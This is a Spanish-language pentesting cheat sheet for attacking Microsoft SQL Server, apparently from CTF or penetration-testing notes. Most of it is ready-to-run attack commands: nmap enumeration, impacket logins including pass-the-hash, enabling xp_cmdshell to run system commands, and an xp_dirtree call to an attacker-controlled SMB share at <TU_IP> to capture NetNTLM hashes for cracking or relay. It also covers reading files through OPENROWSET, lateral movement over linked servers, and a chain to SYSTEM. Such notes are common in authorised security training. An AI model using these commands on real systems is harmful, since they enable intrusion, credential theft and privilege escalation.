# Base de Datos MSSQL (Microsoft SQL Server)

> **Puerto por defecto:** `1433/TCP` (`1434/UDP` para el SQL Server Browser)

MSSQL es la base de datos de Microsoft, muy presente en entornos Windows y Active Directory. Es un objetivo de alto valor: con credenciales puedes conseguir **ejecución de comandos** (`xp_cmdshell`), robar el **hash NetNTLM** del servicio, o moverte lateralmente por el dominio.

---

## Enumeración

```bash
nmap -p1433 -sCV --script="ms-sql-*" <IP>
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password <IP>
```

---

## Conexión

Con **impacket** (muy cómodo, soporta autenticación de Windows):

```bash
impacket-mssqlclient <usuario>:<pass>@<IP>
impacket-mssqlclient <dominio>/<usuario>:<pass>@<IP> -windows-auth
# con hash NTLM (pass-the-hash)
impacket-mssqlclient <dominio>/<usuario>@<IP> -hashes :<hash> -windows-auth
```

Con **netexec** (enumeración masiva):

```bash
netexec mssql <IP> -u <usuario> -p <pass> --local-auth
```

Con `sqsh` o `sqlcmd` también es posible.

---

## Enumeración dentro de MSSQL

```sql
SELECT @@version;
SELECT system_user;
SELECT name FROM sys.databases;      -- bases de datos
-- cambiar de base
USE <base>;
SELECT name FROM sys.tables;
-- ¿soy sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');
```

En el cliente de impacket, cada consulta SQL se ejecuta directamente; usa `enum_db`, `enum_users`, etc. (comandos de ayuda del propio cliente).

---

## Ejecución de comandos: xp_cmdshell

El clásico. Si eres `sysadmin`, habilítalo y ejecuta comandos del sistema:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

En impacket-mssqlclient hay atajos:

```text
enable_xp_cmdshell
xp_cmdshell whoami
```

> **Consejo:** si `xp_cmdshell whoami` devuelve `nt service\mssqlserver` o una cuenta con `SeImpersonatePrivilege`, ve directo a un **Potato attack** para escalar a SYSTEM (ver *Escalada de Privilegios/Windows*).

---

## Robar el hash NetNTLM (relay / crack)

Fuerza al servicio MSSQL a autenticarse contra TU máquina para capturar su hash:

```bash
# En tu máquina:
responder -I tun0
```

```sql
-- En MSSQL: haz que pida un recurso en tu SMB
EXEC xp_dirtree '\\<TU_IP>\share';
EXEC master.dbo.xp_subdirs '\\<TU_IP>\share';
```

Responder captura el hash NetNTLMv2 → crackéalo con hashcat (modo `5600`) o relayéalo con `ntlmrelayx`.

---

## Lectura de archivos

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
```

---

## Movimiento lateral (links entre servidores)

MSSQL puede tener **linked servers** que permiten ejecutar consultas (y comandos) en otros servidores SQL del dominio:

```sql
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY("SERVIDOR2", 'SELECT @@version');
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `impacket-mssqlclient` | Cliente completo (Windows auth, PtH, xp_cmdshell). |
| `netexec mssql` | Enumeración y ejecución masiva. |
| `responder` + `hashcat` | Capturar y crackear el hash NetNTLM del servicio. |
| `nmap` (`ms-sql-*`) | Enumeración inicial. |

---

> **Consejo:** MSSQL es un pivote perfecto en Active Directory. La cadena habitual es: credenciales → `impacket-mssqlclient` → `enable_xp_cmdshell` → shell como la cuenta de servicio → casi siempre con `SeImpersonate` → Potato → **SYSTEM**. Si no eres sysadmin, prueba el truco de `xp_dirtree` con Responder para robar el hash del servicio.
